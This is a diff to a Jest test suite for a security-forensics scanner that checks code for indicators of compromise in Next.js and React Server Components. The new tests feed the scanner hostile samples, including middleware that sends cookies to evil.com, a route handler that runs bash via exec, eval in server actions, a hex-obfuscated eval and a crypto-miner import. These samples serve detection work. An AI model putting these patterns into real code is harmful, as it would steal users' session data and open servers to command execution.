@@ -26,8 +26,8 @@ describe('Layer 8 Security Forensics', () => {
   });
 
   describe('IoC Signature Constants', () => {
-    test('should have 25 IoC signatures defined', () => {
-      expect(constants.IOC_SIGNATURES.signatures.length).toBe(25);
+    test('should have 70 IoC signatures defined', () => {
+      expect(constants.IOC_SIGNATURES.signatures.length).toBe(70);
     });
 
     test('should have required fields for each signature', () => {
@@ -57,11 +57,18 @@ describe('Layer 8 Security Forensics', () => {
       expect(cpSig.severity).toBe('high');
     });
 
-    test('should include RSC-specific patterns', () => {
+    test('should include RSC-specific patterns (15+)', () => {
       const rscPatterns = constants.IOC_SIGNATURES.signatures.filter(
         s => s.category === 'rsc-specific'
       );
-      expect(rscPatterns.length).toBeGreaterThan(0);
+      expect(rscPatterns.length).toBeGreaterThanOrEqual(15);
+    });
+
+    test('should include Next.js-specific patterns (15+)', () => {
+      const nextjsPatterns = constants.IOC_SIGNATURES.signatures.filter(
+        s => s.category === 'nextjs-specific'
+      );
+      expect(nextjsPatterns.length).toBeGreaterThanOrEqual(15);
     });
 
     test('should include exfiltration patterns', () => {
@@ -150,7 +157,7 @@ describe('Layer 8 Security Forensics', () => {
       const code = `const payload = '\\x65\\x76\\x61\\x6c\\x28\\x74\\x68\\x69\\x73\\x29\\x3b\\x72';`;
       const result = analyzer.analyze(code, 'test.js');
       
-      const hexFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-008');
+      const hexFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-012');
       expect(hexFinding).toBeDefined();
       expect(hexFinding.severity).toBe('medium');
       expect(hexFinding.category).toBe('obfuscation');
@@ -160,7 +167,7 @@ describe('Layer 8 Security Forensics', () => {
       const code = "const mod = await import(moduleName);";
       const result = analyzer.analyze(code, 'test.js');
       
-      const dynImportFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-017');
+      const dynImportFinding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-010');
       expect(dynImportFinding).toBeDefined();
     });
 
@@ -212,6 +219,81 @@ line4`;
       
       expect(result.executionTime).toBeDefined();
       expect(typeof result.executionTime).toBe('number');
+    });
+
+    test('should detect server action with eval (IOC-019)', () => {
+      const code = `'use server'; async function action() { return eval(code); }`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-019');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('rsc-specific');
+    });
+
+    test('should detect server action with process spawn (IOC-020)', () => {
+      const code = `'use server'; import { exec } from 'child_process'; exec('ls');`;
+      const result = analyzer.analyze(code, 'actions.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-020');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('rsc-specific');
+    });
+
+    test('should detect middleware cookie exfiltration (IOC-037)', () => {
+      const code = `export async function middleware(req) {
+        const c = cookies();
+        await fetch('https://evil.com', { body: JSON.stringify(c) });
+      }`;
+      const result = analyzer.analyze(code, 'middleware.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-037');
+      expect(finding).toBeDefined();
+      expect(finding.category).toBe('nextjs-specific');
+    });
+
+    test('should detect route handler shell execution (IOC-038)', () => {
+      const code = `export async function GET(request) {
+        exec('bash -c whoami');
+        return Response.json({});
+      }`;
+      const result = analyzer.analyze(code, 'route.ts');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-038');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('nextjs-specific');
+    });
+
+    test('should detect AWS credentials in code (IOC-056)', () => {
+      const code = `const awsKey = 'AKIAIOSFODNN7EXAMPLE';`;
+      const result = analyzer.analyze(code, 'config.js');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-056');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('data-exfiltration');
+    });
+
+    test('should detect SSH private key in code (IOC-048)', () => {
+      const code = `const key = '-----BEGIN RSA PRIVATE KEY-----';`;
+      const result = analyzer.analyze(code, 'secrets.js');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-048');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('backdoor');
+    });
+
+    test('should detect crypto mining library import (IOC-068)', () => {
+      const code = `const miner = require('coinhive');`;
+      const result = analyzer.analyze(code, 'worker.js');
+      
+      const finding = result.findings.find(f => f.signatureId === 'NEUROLINT-IOC-068');
+      expect(finding).toBeDefined();
+      expect(finding.severity).toBe('critical');
+      expect(finding.category).toBe('crypto-mining');
     });
   });
 
